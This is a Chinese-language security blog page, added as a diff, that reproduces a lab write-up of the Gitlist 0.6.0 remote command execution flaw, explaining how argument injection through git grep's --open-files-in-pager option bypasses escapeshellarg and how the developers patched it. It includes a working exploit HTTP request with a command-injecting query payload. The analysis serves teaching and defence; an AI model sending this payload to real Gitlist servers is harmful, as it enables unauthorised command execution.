@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Gitlist 0.6.0 远程命令执行漏洞一、漏洞简介二、漏洞影响Gitlist 0.6.0 三、复现过程环境搭建执行如下命令启动漏洞环境： docker-compose up -d  环境启动后，访问http:&#x2F;&#x2F;your-ip:8080将看到一个名为example的仓库。 漏洞分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Gitlist/Gitlist%200.6.0%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Gitlist 0.6.0 远程命令执行漏洞一、漏洞简介二、漏洞影响Gitlist 0.6.0 三、复现过程环境搭建执行如下命令启动漏洞环境： docker-compose up -d  环境启动后，访问http:&#x2F;&#x2F;your-ip:8080将看到一个名为example的仓库。 漏洞分析">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-07-08T06:25:57.057Z">
+<meta property="article:modified_time" content="2021-04-21T01:23:46.000Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Gitlist/Gitlist 0.6.0 远程命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Gitlist/Gitlist%200.6.0%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:57.057Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Gitlist-0-6-0-远程命令执行漏洞"><a href="#Gitlist-0-6-0-远程命令执行漏洞" class="headerlink" title="Gitlist 0.6.0 远程命令执行漏洞"></a>Gitlist 0.6.0 远程命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Gitlist 0.6.0</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>执行如下命令启动漏洞环境：</p>
+<pre><code>docker-compose up -d
+</code></pre>
+<p>环境启动后，访问<code>http://your-ip:8080</code>将看到一个名为<code>example</code>的仓库。</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在用户对仓库中代码进行搜索的时候，gitlist将调用<code>git grep</code>命令：</p>
+<pre><code>public function searchTree($query, $branch)
+&#123;
+    if (empty($query)) &#123;
+        return null;
+    &#125;
+
+    $query = escapeshellarg($query);
+
+    try &#123;
+        $results = $this-&gt;getClient()-&gt;run($this, &quot;grep -i --line-number &#123;$query&#125; $branch&quot;);
+    &#125; catch (\RuntimeException $e) &#123;
+        return false;
+    &#125;
+</code></pre>
+<p>其中，<code>$query</code>是搜索的关键字，<code>$branch</code>是搜索的分支。</p>
+<p>如果用户输入的<code>$query</code>的值是<code>--open-files-in-pager=id;</code>，将可以执行<code>id</code>命令：1.png导致这个漏洞的原因，有几点：</p>
+<ol>
+<li><p> 开发者对于<code>escapeshellarg</code>函数的误解，造成参数注入</p>
+</li>
+<li><p> <code>git grep</code>的参数<code>--open-files-in-pager</code>的值，将被直接执行</p>
+</li>
+</ol>
+<p>理论上，在经过<code>$query = escapeshellarg($query);</code>处理后，<code>$query</code>将变成一个由单引号包裹的字符串。但不出漏洞的前提是，这个字符串应该出现在”参数值”的位置，而不是出现在参数选项（option）中。</p>
+<p>我们可以试一下如下命令：</p>
+<pre><code>git grep -i --line-number -e &#39;--open-files-in-pager=id;&#39; master
+</code></pre>
+<p>2.png如上图，我将<code>$query</code>放在了<code>-e</code>参数的值的位置，此时它就仅仅是一个字符串而已，并不会被当成参数<code>--open-files-in-pager</code>。</p>
+<p>这应该作为本漏洞的最佳修复方法，也是git官方对pattern可能是用户输入的情况的一种解决方案（以下说明来自man-page）：</p>
+<blockquote>
+<p>-e The next parameter is the pattern. This option has to be used for<br>patterns starting with - and should be used in scripts passing user<br>input to grep. Multiple patterns are combined by or.</p>
+</blockquote>
+<p>当然，gitlist的开发者用了另一种修复方案：</p>
+<pre><code>public function searchTree($query, $branch)
+&#123;
+    if (empty($query)) &#123;
+        return null;
+    &#125;
+    $query = preg_replace(&#39;/(--?[A-Za-z0-9\-]+)/&#39;, &#39;&#39;, $query);
+    $query = escapeshellarg($query);
+    try &#123;
+        $results = $this-&gt;getClient()-&gt;run($this, &quot;grep -i --line-number -- &#123;$query&#125; $branch&quot;);
+    &#125; catch (\RuntimeException $e) &#123;
+        return false;
+    &#125;
+</code></pre>
+<p>首先用<code>preg_replace</code>将<code>-</code>开头的非法字符移除，然后将<code>$query</code>放在<code>--</code>的后面。在命令行解析器中，<code>--</code>的意思是，此后的部分不会再包含参数选项（option）：</p>
+<blockquote>
+<p>A -- signals the end of options and disables further option<br>processing. Any arguments after the -- are treated as filenames and<br>arguments. An argument of - is equivalent to --.</p>
+<p>If arguments remain after option processing, and neither the -c nor<br>the -s option has been supplied, the first argument is assumed to be<br>the name of a file containing shell commands. If bash is invoked in<br>this fashion, $0 is set to the name of the file, and the positional<br>parameters are set to the remaining arguments. Bash reads and executes<br>commands from this file, then exits. Bash&#39;s exit status is the exit<br>status of the last command executed in the script. If no commands are<br>executed, the exit status is 0. An attempt is first made to open the<br>file in the current directory, and, if no file is found, then the<br>shell searches the directories in PATH for the script.</p>
+</blockquote>
+<p>举个简单的例子，如果我们需要查看一个文件名是<code>--name</code>的文件，我们就不能用<code>cat --name</code>来读取，也不能用<code>cat &#39;--name&#39;</code>，而必须要用<code>cat -- --name</code>。从这个例子也能看出，单引号并不是区分一个字符串是”参数值”或”选项”的标准。3.png所以官方这个修复方案也是可以接受的，只不过第一步的preg_replace有点影响正常搜索功能。</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>发送如下数据包：</p>
+<pre><code>POST /example/tree/a/search HTTP/1.1
+Host: www.0-sec.org:8080
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Content-Length: 56
+
+query=--open-files-in-pager=touch /tmp/success;
+</code></pre>
+<p>其中，我们访问的是<code>/example/tree/a/search</code>，example是项目名称，需要是目标gitlist上一个已存在的项目；a在正常情况下应该是分支的名称，也就是<code>&quot;grep -i --line-number &#123;$query&#125; $branch&quot;</code>中的<code>$branch</code>，但因为我们的<code>$query</code>被当成了一个参数，所以<code>$branch</code>就应该被当做搜索的关键字。</p>
+<p>如果没有搜索结果的话，我们的命令是不会被执行的，所以我用了”a”这个关键字，只是为了保证能搜出结果，你也可以换成其他的试试。</p>
+<p>数据包发送后，用<code>docker-compose exec web bash</code>进入容器中，可见<code>/tmp/success</code>已成功创建：4.png</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://vulhub.org//#/environments/gitlist/0.6.0-rce/">https://vulhub.org/\#/environments/gitlist/0.6.0-rce/</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Gitlist/Gitlist%200.6.0%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qpjn0084y8v1c4ow443n" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/GIT-SHELL/%EF%BC%88CVE-2017-8386%EF%BC%89GIT-SHELL%20%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Git-LFS/Git-LFS%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-27955/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
